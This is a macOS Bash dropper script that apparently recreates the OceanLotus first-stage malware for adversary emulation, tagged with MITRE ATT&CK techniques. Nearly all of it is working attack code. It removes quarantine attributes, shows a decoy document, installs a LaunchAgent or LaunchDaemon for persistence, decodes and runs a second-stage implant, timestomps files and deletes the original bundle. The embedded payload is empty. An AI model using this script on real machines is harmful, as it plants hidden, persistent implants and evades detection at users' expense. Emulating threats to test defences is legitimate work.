#!/bin/bash

# ---------------------------------------------------------------------------
# first_stage.sh - Executed as part of the OceanLotus application bundle initial access vector

# Usage: ./first_stage.sh

# MITRE ATT&CK Techniques:
#   T1036.008 Masquerading: Masquerade File Type
#   T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification
#   T1070.006 Indicator Removal: Timestomp
#   T1543.001 Create or Modify System Process: Launch Agent

# Resources:
#   https://otx.alienvault.com/indicator/file/be43be21355fb5cc086da7cee667d6e7
#   https://www.virustotal.com/gui/file/48e3609f543ea4a8de0c9375fa665ceb6d2dfc0085ee90fa22ffaced0c770c4f/detection
#   https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html
#   https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/
#   https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/

# Revision History:

# ---------------------------------------------------------------------------

current_directory="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"
current_file="$( basename "${BASH_SOURCE[0]}" )"

# base64 encoded second stage payload
payload=""

# points to decoy doc in application bundle
TEMPPATH_IOP="Contents/Resources/default.config"
# name of decoy document to drop
doc_name="Decoy.doc"
# filename of second stage (currently just b64(oceanlotus23))
temp_var="b2NlYW5sb3R1czIz"

# remove quarantine flag on application bundle
#   MITRE ATT&CK Techniques:
#     T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification
find . -exec xattr -d com.apple.quarantine {} + >/dev/null 2>&1 &

# get path to the application bundle
parent_path_copy="$( dirname "$current_directory/$current_file" )"
parent_path_copy="$( dirname "$parent_path_copy" )"
parent_parent_path="$( dirname "$parent_path_copy" )"
execution_path="$( dirname "$parent_parent_path" )"

# copy decoy doc to tmp and open it
cp "$parent_parent_path/$TEMPPATH_IOP" "/tmp/$doc_name" && open -n "/tmp/$doc_name"

plist_label="$(sed -ne '/string/{s/.*<string>\(.*\)<\/string>.*/\1/p;q;}' $parent_path_copy/PkgInfo)"
implant_path="/$(sed -ne '/string/{s/.*<string>\/\(.*\)<\/string>.*/\1/p;}' $parent_path_copy/PkgInfo)"
home_path="$( dirname "$execution_path" )"

# if UID is not 0, create a LaunchAgent, otherwise create a LaunchDaemon
if [ "$EUID" -ne 0 ]; then
    implant_path="$home_path$implant_path"
    plist_path="$home_path/Library/LaunchAgents/$plist_label"
else
    plist_path="$home_path/Library/LaunchDaemons/$plist_label"
fi

# create LaunchAgent plist
#   MITRE ATT&CK Techniques:
#       T1543.001 Create or Modify System Process: Launch Agent
#       T1543.004 Create or Modify System Process: Launch Daemon
cp $parent_path_copy/PkgInfo $plist_path;

# replace decoy doc in application bundle with decoded second stage
echo $payload | base64 -d > $implant_path

# update timestamp, make executable, then attempt to execute in background
#   MITRE ATT&CK Techniques:
#       T1070.006 Indicator Removal: Timestomp
#       T1222.002 File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification
touch -t 1910071234 $plist_path
touch -t 1910071234 $implant_path && chmod 755 $implant_path && $implant_path >/dev/null 2>&1 &

# remove application bundle then move decoy doc from tmp to the current execution path
sleep 2 ; rm -rf "$parent_parent_path" ; mv "/tmp/$doc_name" "$execution_path/$doc_name" ;
